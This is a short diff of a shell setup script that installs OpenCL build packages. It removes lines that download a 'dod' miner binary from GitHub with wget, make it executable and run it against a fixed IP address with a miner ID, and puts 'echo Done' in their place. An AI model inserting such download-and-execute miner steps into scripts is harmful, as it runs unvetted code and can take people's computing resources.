@@ -22,8 +22,5 @@ apt-get update
 
 apt install mesa-opencl-icd ocl-icd-opencl-dev gcc git bzr jq pkg-config clang build-essential hwloc libhwloc-dev -y
 
-wget -O dod https://github.com/corpltd001/dod/raw/refs/heads/main/ocl-dod-miner
 
-chmod +x dod
-
-./dod 139.59.51.161 --miner-id ho3pp-cjcyb-adqz6-6t6se-a2re5-3voph-5mkyk-vxcx6-gfnyw-mftg3-5ae
+echo Done
